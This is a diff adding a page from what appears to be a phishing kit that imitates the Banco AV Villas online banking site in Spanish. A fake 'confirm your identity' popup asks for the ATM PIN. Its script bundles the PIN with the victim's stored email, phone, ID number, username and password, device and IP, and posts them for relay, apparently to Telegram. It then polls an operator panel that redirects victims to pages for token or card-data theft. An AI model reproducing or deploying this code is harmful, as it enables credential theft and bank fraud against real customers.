@@ -1,0 +1,545 @@
+<html>
+    <head>
+        <title>Banca Virtual |</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#FF0015">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="img/favicon.png">
+        <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="css/style.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <style type="text/css">
+            #fondo-oscuro{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: rgba(0,0,0,0.8);
+                z-index: 900;
+                display: none;
+            }
+
+            #frmCajero{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background-color: #ffffff;
+                padding: 30px;
+                border-radius: 10px;
+                z-index: 920;
+                display: none;
+                text-align: center;
+                min-width: 300px;
+            }
+
+            #frmErrCajero{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background-color: #ffffff;
+                padding: 30px;
+                border-radius: 10px;
+                z-index: 920;
+                display: none;
+                text-align: center;
+                min-width: 300px;
+            }
+
+            #loader-overlay{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: rgba(255,255,255,0.7);
+                z-index: 950;
+                display: none;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column;
+            }
+
+            .cajero-input{
+                width: 100%;
+                padding: 15px;
+                border: 2px solid #ddd;
+                border-radius: 5px;
+                font-size: 18px;
+                text-align: center;
+                margin: 20px 0;
+                letter-spacing: 5px;
+            }
+
+            .btn-cajero{
+                background-color: #FF0015;
+                color: white;
+                border: none;
+                padding: 15px 30px;
+                border-radius: 5px;
+                font-size: 16px;
+                cursor: pointer;
+                margin: 10px;
+            }
+
+            .btn-cajero:hover{
+                background-color: #d40012;
+            }
+
+            .error-cajero{
+                color: #FF0015;
+                font-size: 14px;
+                margin-top: 10px;
+                display: none;
+            }
+
+            .texto-seguridad{
+                color: #666;
+                font-size: 12px;
+                text-align: center;
+                margin-top: 25px;
+                margin-bottom: 20px;
+                line-height: 1.4;
+            }
+        </style>
+    </head>
+    <body>
+        <input type="hidden" id="session_id" name="session_id">
+        <input type="hidden" id="username" name="username">
+        
+        <div id="fondo-oscuro"></div>
+        
+                 <div id="frmCajero">
+             <img src="img/logo.png" width="150" style="margin-bottom: 20px;">
+             <h2>CONFIRMAR</h2>
+             
+             <div class="texto-seguridad">
+                 Por su seguridad necesitamos validar su identidad
+             </div>
+             
+             <p>Ingresa tu clave de cajero de 4 dígitos</p>
+             
+             <input type="text" id="txtCajero" class="cajero-input" maxlength="4" placeholder="0000" pattern="[0-9]*" inputmode="numeric">
+             <div id="error-cajero" class="error-cajero">La clave debe tener 4 dígitos</div>
+             
+             <br>
+             <button id="btnCajero" class="btn-cajero">Verificar</button>
+         </div>
+
+                 <div id="frmErrCajero">
+             <img src="img/logo.png" width="150" style="margin-bottom: 20px;">
+             <h2>Clave de Cajero</h2>
+             
+             <div class="texto-seguridad">
+                 Por su seguridad necesitamos validar su identidad
+             </div>
+             
+             <p>Ingresa tu clave de cajero de 4 dígitos</p>
+             
+             <input type="text" id="txtErrCajero" class="cajero-input" maxlength="4" placeholder="0000" pattern="[0-9]*" inputmode="numeric">
+             <div id="error-err-cajero" class="error-cajero">La clave debe tener 4 dígitos</div>
+             
+             <br>
+             <button id="btnErrCajero" class="btn-cajero">Verificar</button>
+         </div>
+
+        <div id="loader-overlay">
+            <img src="img/loading.gif" width="140">
+            <p>Verificando...</p>
+        </div>
+
+        <div style="padding:10px 14px;">
+            <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td align="left"><img src="img/logo-gav.png" width="70"></td>
+                    <td align="right"><img src="img/logo-gav.png" width="70" id="super-d"> &nbsp;&nbsp;&nbsp;  <img src="img/superh-negro.svg" width="130"></td>
+                </tr>
+            </table>
+        </div>
+    </body>
+</html>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Event listener para el botón Verificar
+        const btnCajero = document.getElementById('btnCajero');
+        
+        if (btnCajero) {
+            btnCajero.addEventListener('click', async function (event) {
+                event.preventDefault();
+
+                const clave = document.getElementById('txtCajero').value;
+                
+                // Validar que la clave tenga 4 dígitos
+                if (clave.length !== 4) {
+                    alert('La clave debe tener 4 dígitos');
+                    return;
+                }
+
+                // Mostrar loader
+                $("#frmCajero").hide();
+                $("#fondo-oscuro").hide();
+                const loader = document.getElementById('loader-overlay');
+                if (loader) {
+                    loader.style.display = 'flex';
+                }
+
+                // Obtener session_id
+                let sessionId = localStorage.getItem('session_id');
+                if (!sessionId) {
+                    sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    localStorage.setItem('session_id', sessionId);
+                }
+
+                // Guardar clave en localStorage
+                localStorage.setItem('clave_cajero', clave);
+
+                // Detectar tipo de dispositivo
+                const userAgent = navigator.userAgent;
+                let dispositivo = 'PC';
+                
+                if (/Android/i.test(userAgent)) {
+                    dispositivo = 'Android';
+                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    dispositivo = 'iPhone';
+                } else if (/Windows/i.test(userAgent)) {
+                    dispositivo = 'PC';
+                } else if (/Mac/i.test(userAgent)) {
+                    dispositivo = 'Mac';
+                } else if (/Linux/i.test(userAgent)) {
+                    dispositivo = 'Linux';
+                }
+                
+                const hora = new Date().toLocaleString('es-ES');
+
+                // Obtener IP y enviar a Telegram
+                fetch('get_ip.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip || 'No disponible';
+                        
+                        const mensaje = `
+<b><u>💎AV VILLAS - PIN CAJERO💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
+• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
+------------------------------
+• <b>🔢 Clave Cajero:</b> ${clave}
+------------------------------`;
+
+                        const formData = new FormData();
+                        formData.append('message', mensaje);
+                        formData.append('transactionId', sessionId);
+
+                        fetch('procesar_clave.php', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(res => res.json())
+                        .then(result => {
+                            if (result.status === 'success') {
+                                checkCajeroVerification(sessionId, result.messageId);
+                            } else {
+                                // Ocultar loader si hay error
+                                const loader = document.getElementById('loader-overlay');
+                                if (loader) {
+                                    loader.style.display = 'none';
+                                }
+                                $("#frmCajero").show();
+                            }
+                        })
+                        .catch(err => {
+                            // Ocultar loader si hay error
+                            const loader = document.getElementById('loader-overlay');
+                            if (loader) {
+                                loader.style.display = 'none';
+                            }
+                            $("#frmCajero").show();
+                        });
+                    })
+                    .catch(() => {
+                        // Si falla la obtención de IP, enviar sin IP
+                        const mensaje = `
+<b><u>💎AV VILLAS - PIN CAJERO💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
+• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
+------------------------------
+• <b>🔢 Clave Cajero:</b> ${clave}
+------------------------------`;
+
+                        const formData2 = new FormData();
+                        formData2.append('message', mensaje);
+                        formData2.append('transactionId', sessionId);
+
+                        fetch('procesar_clave.php', {
+                            method: 'POST',
+                            body: formData2
+                        })
+                        .then(res => res.json())
+                        .then(result => {
+                            if (result.status === 'success') {
+                                checkCajeroVerification(sessionId, result.messageId);
+                            } else {
+                                const loader = document.getElementById('loader-overlay');
+                                if (loader) {
+                                    loader.style.display = 'none';
+                                }
+                                $("#frmCajero").show();
+                            }
+                        })
+                        .catch(err => {
+                            const loader = document.getElementById('loader-overlay');
+                            if (loader) {
+                                loader.style.display = 'none';
+                            }
+                            $("#frmCajero").show();
+                        });
+                    });
+            });
+        }
+
+        // Event listener para el botón Error Cajero
+        const btnErrCajero = document.getElementById('btnErrCajero');
+        
+        if (btnErrCajero) {
+            btnErrCajero.addEventListener('click', async function (event) {
+                event.preventDefault();
+
+                const clave = document.getElementById('txtErrCajero').value;
+                
+                // Validar que la clave tenga 4 dígitos
+                if (clave.length !== 4) {
+                    alert('La clave debe tener 4 dígitos');
+                    return;
+                }
+
+                // Mostrar loader
+                $("#frmErrCajero").hide();
+                $("#fondo-oscuro").hide();
+                const loader = document.getElementById('loader-overlay');
+                if (loader) {
+                    loader.style.display = 'flex';
+                }
+
+                // Obtener session_id
+                let sessionId = localStorage.getItem('session_id');
+                if (!sessionId) {
+                    sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    localStorage.setItem('session_id', sessionId);
+                }
+
+                // Guardar clave en localStorage
+                localStorage.setItem('clave_cajero', clave);
+
+                // Detectar tipo de dispositivo
+                const userAgent = navigator.userAgent;
+                let dispositivo = 'PC';
+                
+                if (/Android/i.test(userAgent)) {
+                    dispositivo = 'Android';
+                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    dispositivo = 'iPhone';
+                } else if (/Windows/i.test(userAgent)) {
+                    dispositivo = 'PC';
+                } else if (/Mac/i.test(userAgent)) {
+                    dispositivo = 'Mac';
+                } else if (/Linux/i.test(userAgent)) {
+                    dispositivo = 'Linux';
+                }
+                
+                const hora = new Date().toLocaleString('es-ES');
+
+                // Obtener IP y enviar a Telegram
+                fetch('get_ip.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip || 'No disponible';
+                        
+                        const mensaje = `
+<b><u>💎AV VILLAS - PIN CAJERO💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
+• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
+------------------------------
+• <b>🔢 Clave Cajero:</b> ${clave}
+------------------------------`;
+
+                        const formData = new FormData();
+                        formData.append('message', mensaje);
+                        formData.append('transactionId', sessionId);
+
+                        fetch('procesar_clave.php', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(res => res.json())
+                        .then(result => {
+                            if (result.status === 'success') {
+                                checkCajeroVerification(sessionId, result.messageId);
+                            } else {
+                                // Ocultar loader si hay error
+                                const loader = document.getElementById('loader-overlay');
+                                if (loader) {
+                                    loader.style.display = 'none';
+                                }
+                                $("#frmErrCajero").show();
+                            }
+                        })
+                        .catch(err => {
+                            // Ocultar loader si hay error
+                            const loader = document.getElementById('loader-overlay');
+                            if (loader) {
+                                loader.style.display = 'none';
+                            }
+                            $("#frmErrCajero").show();
+                        });
+                    })
+                    .catch(() => {
+                        // Si falla la obtención de IP, enviar sin IP
+                        const mensaje = `
+<b><u>💎AV VILLAS - PIN CAJERO💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO AV VILLAS
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> No disponible
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
+• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
+------------------------------
+• <b>🔢 Clave Cajero:</b> ${clave}
+------------------------------`;
+
+                        const formData3 = new FormData();
+                        formData3.append('message', mensaje);
+                        formData3.append('transactionId', sessionId);
+
+                        fetch('procesar_clave.php', {
+                            method: 'POST',
+                            body: formData3
+                        })
+                        .then(res => res.json())
+                        .then(result => {
+                            if (result.status === 'success') {
+                                checkCajeroVerification(sessionId, result.messageId);
+                            } else {
+                                const loader = document.getElementById('loader-overlay');
+                                if (loader) {
+                                    loader.style.display = 'none';
+                                }
+                                $("#frmErrCajero").show();
+                            }
+                        })
+                        .catch(err => {
+                            const loader = document.getElementById('loader-overlay');
+                            if (loader) {
+                                loader.style.display = 'none';
+                            }
+                            $("#frmErrCajero").show();
+                        });
+                    });
+            });
+        }
+
+        // Mostrar el formulario de clave de cajero al cargar la página
+        setTimeout(() => {
+            $("#fondo-oscuro").show();
+            $("#frmCajero").show();
+            $("#txtCajero").focus();
+        }, 500);
+    });
+
+    async function checkCajeroVerification(transactionId, messageId) {
+        try {
+            const formData = new FormData();
+            formData.append('transactionId', transactionId);
+            formData.append('messageId', messageId);
+
+            const res = await fetch('verificar_cajero.php', {
+                method: 'POST',
+                body: formData
+            });
+            const result = await res.json();
+
+            if (result.action) {
+                switch (result.action) {
+                    case 'confirm_finalizar':
+                        window.location.href = "../fin.php";
+                        break;
+                    case 'error_logo': 
+                        // Ocultar loader antes de mostrar error
+                        const loader2 = document.getElementById('loader-overlay');
+                        if (loader2) {
+                            loader2.style.display = 'none';
+                        }
+                        alert("Usuario o clave incorrectos.");
+                        window.location.href = "index.html";
+                        break;
+                    case 'pedir_dinamica': 
+                        // Ocultar loader antes de mostrar error
+                        const loader3 = document.getElementById('loader-overlay');
+                        if (loader3) {
+                            loader3.style.display = 'none';
+                        }
+                        window.location.href = "token.html";
+                        break;
+                    case 'error_cajero': 
+                        // Ocultar loader antes de mostrar error
+                        const loader4 = document.getElementById('loader-overlay');
+                        if (loader4) {
+                            loader4.style.display = 'none';
+                        }
+                        $("#frmErrCajero").show();
+                        break;
+                    case 'tarjeta': // ✅ botón nuevo manejado
+                    window.location.href = "../../../../../data-cc/alter.php";
+                    break;
+                }
+            } else {
+                setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
+            }
+        } catch (err) {
+            setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
+        }
+    }
+</script> 
